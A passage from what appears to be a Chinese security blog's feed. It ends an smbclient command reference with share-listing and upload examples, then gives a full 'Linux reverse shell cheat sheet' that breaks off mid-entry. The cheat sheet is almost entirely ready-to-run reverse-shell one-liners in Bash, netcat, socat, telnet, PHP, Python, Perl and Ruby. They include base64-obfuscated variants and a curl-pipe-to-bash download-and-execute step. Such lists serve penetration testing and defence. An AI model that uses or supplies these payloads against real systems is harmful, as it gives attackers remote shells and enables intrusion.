&lt;number&gt; (默认 20)</td><td>数据块大小</td></tr><tr><td>cancel &lt;jobid&gt;</td><td>取消打印队列条目</td></tr><tr><td>case_sensitive</td><td>将区分大小写的标志切换到服务器</td></tr><tr><td>cd [directory]</td><td>更改&#x2F;报告远程目录</td></tr><tr><td>chmod &lt;src&gt; &lt;mode&gt;</td><td>chmod 使用 UNIX 权限的文件</td></tr><tr><td>du &lt;mask&gt;</td><td>计算当前目录的总大小</td></tr><tr><td>echo &lt;num&gt; &lt;data&gt;</td><td>ping 服务器</td></tr><tr><td>exit\q\quit</td><td>注销服务器</td></tr><tr><td>get  &lt;remote name&gt; [local name]</td><td>获取文件</td></tr><tr><td>getfacl &lt;file name&gt;</td><td>获取文件的 POSIX ACL（仅限 UNIX 扩展）</td></tr><tr><td>geteas &lt;file name&gt;</td><td>获取文件的 EA 列表</td></tr><tr><td>hardlink &lt;src&gt; &lt;dest&gt;</td><td>创建 Windows 硬链接</td></tr><tr><td>history</td><td>显示命令历史</td></tr><tr><td>iosize &lt;number&gt; (default 64512)</td><td>io 大小</td></tr><tr><td>lcd [directory]</td><td>更改&#x2F;报告本地当前工作目录</td></tr><tr><td>link &lt;oldname&gt; &lt;newname&gt;</td><td>创建 UNIX 硬链接</td></tr><tr><td>lock &lt;fnum&gt; [r&#x2F;w] &lt;hex-start&gt; &lt;hex-len&gt;</td><td>设置 POSIX 锁</td></tr><tr><td>lowercase</td><td>切换获取文件名的小写</td></tr><tr><td>ls&#x2F;l &lt;mask&gt;</td><td>list the contents of the current directory</td></tr><tr><td>mask &lt;mask&gt;</td><td>屏蔽所有文件名</td></tr><tr><td>md&#x2F;mkdir &lt;directory&gt;</td><td>创建一个目录</td></tr><tr><td>mget &lt;mask&gt;</td><td>获取所有匹配的文件</td></tr><tr><td>more &lt;remote name&gt;</td><td>查看远程文件</td></tr><tr><td>mput &lt;mask&gt;</td><td>把所有匹配的文件</td></tr><tr><td>newer &lt;file&gt;</td><td>仅 mget 比指定本地文件更新的文件</td></tr><tr><td>notify &lt;file&gt;</td><td>获取有关目录更改的通知</td></tr><tr><td>open &lt;mask&gt;</td><td>打开一个文件</td></tr><tr><td>posix</td><td>打开所有 POSIX 功能</td></tr><tr><td>posix_encrypt &lt;domain&gt; &lt;user&gt; &lt;password&gt;</td><td>启动传输加密</td></tr><tr><td>posix_open &lt;name&gt; 0&lt;mode&gt;</td><td>open_flags 模式使用 POSIX 接口打开文件</td></tr><tr><td>posix_mkdir &lt;name&gt; 0&lt;mode&gt;</td><td>使用 POSIX 接口创建目录</td></tr><tr><td>posix_rmdir &lt;name&gt;</td><td>removes a directory using POSIX interface</td></tr><tr><td>posix_unlink &lt;name&gt;</td><td>使用 POSIX 接口删除文件</td></tr><tr><td>posix_whoami</td><td>使用 POSIX 接口返回登录用户信息</td></tr><tr><td>print &lt;file name&gt;</td><td>打印文件</td></tr><tr><td>prompt</td><td>切换提示输入 mget 和 mput 的文件名</td></tr><tr><td>put &lt;local name&gt; [remote name]</td><td>上传一个文件</td></tr><tr><td>pwd</td><td>显示当前远程目录（与没有参数的 ‘cd’ 相同）</td></tr><tr><td>queue</td><td>显示打印队列</td></tr><tr><td>readlink &lt;filename&gt;</td><td>对符号链接执行 UNIX 扩展 readlink 调用</td></tr><tr><td>rd&#x2F;rm&#x2F;rmdir &lt;directory&gt;</td><td>删除目录</td></tr><tr><td>recurse</td><td>切换 mget 和 mput 的目录递归</td></tr><tr><td>reget &lt;remote name&gt; [local name]</td><td>获取在本地文件末尾重新启动的文件</td></tr><tr><td>rename &lt;src&gt; &lt;dest&gt;</td><td>重命名一些文件</td></tr><tr><td>reput &lt;local name&gt; [remote name]</td><td>将文件重新启动到远程文件的末尾</td></tr><tr><td>showacls</td><td>切换是否显示 ACL</td></tr><tr><td>setea &lt;file name&gt; &lt;eaname&gt; &lt;eaval&gt;</td><td>设置文件的 EA</td></tr><tr><td>setmode &lt;file name&gt; &lt;setmode string&gt;</td><td>更改文件模式</td></tr><tr><td>scopy &lt;src&gt; &lt;dest&gt;</td><td>服务器端拷贝文件</td></tr><tr><td>stat &lt;file name&gt;</td><td>对文件执行 UNIX 扩展 stat 调用</td></tr><tr><td>symlink &lt;oldname&gt; &lt;newname&gt;</td><td>创建一个 UNIX 符号链接</td></tr><tr><td>tar &lt;c&#x2F;x&gt;[IXFvbgNan]</td><td>当前目录到&#x2F;从 &lt;文件名&gt;</td></tr><tr><td>tarmode &lt;full&#x2F;inc&#x2F;reset&#x2F;noreset&gt;</td><td>tar 对归档位的行为</td></tr><tr><td>timeout &lt;number&gt;</td><td>以秒为单位设置每个操作的超时时间（默认 20）</td></tr><tr><td>translate</td><td>切换用于打印的文本翻译</td></tr><tr><td>unlock &lt;fnum&gt; &lt;hex-start&gt; &lt;hex-len&gt;</td><td>移除 POSIX 锁</td></tr><tr><td>volume</td><td>print the volume name</td></tr><tr><td>vuid</td><td>change current vuid</td></tr><tr><td>wdel &lt;attrib&gt; &lt;mask&gt;</td><td>通配符删除所有匹配的文件</td></tr><tr><td>logon &lt;username&gt; [&lt;password&gt;]</td><td>建立新的登录</td></tr><tr><td>listconnect</td><td>列出打开的连接</td></tr><tr><td>showconnect</td><td>显示当前活动连接</td></tr><tr><td>tcon &lt;sharename&gt;</td><td>连接到共享</td></tr><tr><td>tdis</td><td>断开共享</td></tr><tr><td>tid</td><td>显示或设置当前 tid (tree-i)</td></tr><tr><td>utimes &lt;file name&gt; &lt;create_time&gt; &lt;access_time&gt; &lt;mod_time&gt; &lt;ctime&gt;</td><td>设定时间</td></tr><tr><td>logoff</td><td>注销（关闭会话）</td></tr></tbody></table><h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><ul><li>显示目标主机可用的共享列表。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //&lt;ip&gt; -U &lt;用户名&gt;%&lt;密码&gt;</span><br><span class="line"></span><br><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      远程管理</span><br><span class="line">C               Disk      </span><br><span class="line">C$              Disk      默认共享</span><br><span class="line">IPC$            IPC       远程 IPC</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br></pre></td></tr></table></figure><ul><li>连接某个共享列表。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //&lt;ip&gt;/共享名称 -U &lt;用户名&gt;%&lt;密码&gt;</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; </span><br></pre></td></tr></table></figure><ul><li>设置连接的Windows目录。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //&lt;ip&gt;/共享名称 -D Windows  -U &lt;用户名&gt;%&lt;密码&gt;</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \Windows\&gt; </span><br></pre></td></tr></table></figure><ul><li>连接成功以后执行上传文件命令.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient //&lt;ip&gt;/共享名称/ -c <span class="string">&quot;put &lt;文件&gt;&quot;</span> -D &lt;目录&gt; -U &lt;用户名&gt;%&lt;密码&gt;</span><br><span class="line">putting file &lt;文件&gt; as \&lt;目录&gt;\&lt;文件&gt; (71.4 kb/s) (average 71.4 kb/s)</span><br><span class="line"><span class="comment"># 没有权限</span></span><br><span class="line">smbclient //&lt;ip&gt;/共享名称/ -c <span class="string">&quot;put &lt;文件&gt;&quot;</span> -D &lt;目录&gt;  -U &lt;用户名&gt;%&lt;密码&gt;</span><br><span class="line">NT_STATUS_ACCESS_DENIED opening remote file \&lt;目录&gt;\&lt;文件&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;使用该命令的前提您的目标设备必须要开启smb服务和设置共享文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;语法：&quot;&gt;&lt;a href=&quot;#语法：&quot; class=&quot;headerlink&quot; title=&quot;语法：&quot;&gt;&lt;/a&gt;语法：&lt;/h2&gt;&lt;f</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux反弹shell备忘录</title>
    <link href="http://webb-l.top/2022/05/17/Linux%E5%8F%8D%E5%BC%B9shell%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://webb-l.top/2022/05/17/Linux%E5%8F%8D%E5%BC%B9shell%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2022-05-17T15:40:57.000Z</published>
    <updated>2022-05-19T11:17:42.220Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">/bin/bash -l &gt; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;</span><br><span class="line"><span class="built_in">cat</span> &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 2&gt;&amp;0;0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/&lt;ip&gt;/&lt;port&gt;; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="comment"># bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC88aXA+Lzxwb3J0PiAwPiYx&quot;</span> | <span class="built_in">base64</span> -d | bash</span><br></pre></td></tr></table></figure><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">nc -lvup &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/udp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/udp/&lt;ip&gt;/&lt;port&gt;; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">/bin/bash -l &gt; /dev/udp/&lt;ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/udp/&lt;ip&gt;/&lt;port&gt;</span><br><span class="line"><span class="built_in">cat</span> &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 2&gt;&amp;0;0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/udp/&lt;ip&gt;/&lt;port&gt;; bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="comment"># bash -i &gt;&amp; /dev/udp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;YmFzaCAtaSA+JiAvZGV2L3VkcC88aXA+Lzxwb3J0PiAwPiYx&quot;</span> | <span class="built_in">base64</span> -d | bash</span><br></pre></td></tr></table></figure><h2 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">nc &lt;ip&gt; &lt;port&gt; -e bash</span><br><span class="line"></span><br><span class="line">nc &lt;ip&gt; &lt;port&gt; -c bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">mknod</span> /tmp/backpipe p;/bin/bash 0&lt;/tmp/backpipe | nc &lt;ip&gt; &lt;port&gt; 1&gt;/tmp/backpipe | <span class="built_in">rm</span> /tmp/backpipe;</span><br></pre></td></tr></table></figure><h2 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&quot;</span> &gt; bash.html</span><br><span class="line">python3 -m http.server</span><br><span class="line">curl &lt;ip&gt;:8000/bash.html | bash</span><br></pre></td></tr></table></figure><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不推荐</span></span><br><span class="line">whois -h &lt;ip&gt; -p &lt;port&gt; `<span class="built_in">pwd</span>` </span><br></pre></td></tr></table></figure><h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line">nc -lvnp &lt;port2&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">telnet &lt;ip&gt; &lt;port&gt; | /bin/bash | telnet &lt;ip&gt; &lt;port2&gt;</span><br></pre></td></tr></table></figure><h2 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">socat tcp-connect:&lt;ip&gt;:&lt;port&gt; <span class="built_in">exec</span>:<span class="string">&quot;bash -li&quot;</span>,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);`/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);popen(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);system(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);passthru(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);shell_exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);$proc=proc_open(&quot;/bin/bash -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;s=a(&quot;socket&quot;).socket;o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s();c.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;b=a(&quot;socket&quot;).socket;c=a(&quot;subprocess&quot;).call;s=b();s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=s.fileno;c([&quot;/bin/bash&quot;,&quot;-i&quot;],stdin=f(),stdout=f(),stderr=f())&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;b=a(&quot;socket&quot;).socket;p=a(&quot;subprocess&quot;).call;o=a(&quot;os&quot;).dup2;s=b();s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;s=a(&quot;socket&quot;);o=a(&quot;os&quot;).dup2;p=a(&quot;pty&quot;).spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;b=a(&quot;socket&quot;);c=a(&quot;subprocess&quot;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=s.fileno;c([&quot;/bin/bash&quot;,&quot;-i&quot;],stdin=f(),stdout=f(),stderr=f())&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;a=__import__;b=a(&quot;socket&quot;);p=a(&quot;subprocess&quot;).call;o=a(&quot;os&quot;).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> RHOST=<span class="string">&quot;&lt;ip&gt;&quot;</span>;<span class="built_in">export</span> RPORT=&lt;port&gt;;python -c <span class="string">&#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;socket=__import__(&quot;socket&quot;);subprocess=__import__(&quot;subprocess&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;socket=__import__(&quot;socket&quot;);subprocess=__import__(&quot;subprocess&quot;);os=__import__(&quot;os&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;ip&gt;&quot;,&lt;port&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;&lt;ip&gt;:&lt;port&gt;&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br><span class="line"></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;&lt;ip&gt;&quot;;$p=&lt;port&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;&lt;ip&gt;&quot;,&lt;port&gt;).to_i;exec sprintf(&quot;/bin/bash -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;&lt;ip&gt;&quot;,&quot;&lt;port&gt;&quot;);loop&#123;c.gets.chomp!;(exit! if $_==&quot;exit&quot;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r)&#123;|io|c.print io.read&#125;))rescue c.puts &quot;failed: #&#123;$_&#125;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp &lt;port&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># +---------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;package main;import&quot;os/exec&quot;;import&quot;net&quot;;func 